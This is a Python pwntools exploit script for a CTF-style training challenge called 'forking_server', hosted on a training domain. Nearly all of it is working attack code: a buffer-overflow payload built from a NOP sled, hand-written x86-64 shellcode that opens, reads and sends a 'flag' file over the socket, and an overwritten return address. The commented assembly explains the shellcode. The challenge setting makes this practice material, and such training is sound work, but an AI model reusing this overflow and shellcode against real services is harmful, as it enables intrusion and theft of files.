from pwn import *

CHALL_PATH = "./forking_server"
COMMANDS = """
b *0x4015C6
b *0x40168C
c
"""

context.arch = "amd64"

if args.GDB:
    c = gdb.debug(CHALL_PATH, COMMANDS)
elif args.REM:
    #c = remote("localhost", 4000) to debug on local
    c = remote("forking-server.training.offensivedefensive.it", 8080, ssl=True)
else:
    c = process(CHALL_PATH)

buffer = 0x404100

shell = b"\x48\xC7\xC0\x02\x00\x00\x00\x52\x48\x8D\x7C\x24\x08\x48\x31\xF6\x48\x31\xD2\x0F\x05\x48\x89\xC7\x48\x89\xE6\x48\xC7\xC2\x64\x00\x00\x00\x48\x31\xC0\x0F\x05\x48\xC7\xC0\x01\x00\x00\x00\x48\x31\xFF\x48\xC7\xC7\x04\x00\x00\x00\x0F\x05"
len = 58
payload = b"\x90" * (0x3F0-58) + shell + b"\x90" * 8 + b"\x00\x41\x40\x00\x00\x00\x00\x00" + b"flag\x00"

# Does an open, read, write but writes in the file descriptor of the socket (4)
# to let the client see the output
asm_code = """
mov rax, 2
push rdx
lea rdi, [rsp+8] # to read top of the stack + 8 (flag string) 
xor rsi, rsi
xor rdx, rdx
syscall
mov rdi, rax
mov rsi, rsp
mov rdx, 100
xor rax, rax
syscall
mov rax, 1
xor rdi, rdi
mov rdi, 4 # socket file descriptor instead of stdout
syscall
"""
c.recvuntil(b"?")

c.send(payload)

c.interactive()